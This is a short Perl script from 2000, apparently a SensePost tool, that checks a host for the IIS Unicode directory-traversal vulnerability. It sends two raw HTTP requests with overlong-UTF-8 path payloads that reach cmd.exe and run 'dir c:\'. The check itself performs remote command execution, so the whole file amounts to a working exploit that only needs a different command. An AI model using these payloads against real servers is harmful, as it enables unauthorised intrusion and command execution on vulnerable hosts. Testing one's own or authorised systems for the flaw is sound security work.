#!/usr/bin/perl
# Very simple PERL script to test a machine for Unicode vulnerability. 
# Use port number with SSLproxy for testing SSL sites
# Usage: unicodecheck IP:port
# Only makes use of "Socket" library
# Roelof Temmingh 2000/10/21
# roelof@sensepost.com http://www.sensepost.com

use Socket;
# --------------init
if ($#ARGV<0) {die "Usage: unicodecheck IP:port\n";}
($host,$port)=split(/:/,@ARGV[0]);
print "Testing $host:$port : ";
$target = inet_aton($host);
$flag=0;
# ---------------test method 1
my @results=sendraw("GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}
# ---------------test method 2
my @results=sendraw("GET /scripts/..%c1%9c../winnt/system32/cmd.exe?/c+dir+c:\ HTTP/1.0\r\n\r\n");
foreach $line (@results){
 if ($line =~ /Directory/) {$flag=1;}}
# ---------------result
if ($flag==1){print "Vulnerable\n";}
else {print "Safe\n";}
# ------------- Sendraw - thanx RFP rfp@wiretrip.net
sub sendraw {   # this saves the whole transaction anyway
        my ($pstr)=@_;
        socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp')||0) ||
                die("Socket problems\n");
        if(connect(S,pack "SnA4x8",2,$port,$target)){
                my @in;
                select(S);      $|=1;   print $pstr;
                while(<S>){ push @in, $_;}
                select(STDOUT); close(S); return @in;
        } else { die("Can't connect...\n"); }
}
# Spidermark: sensepostdata


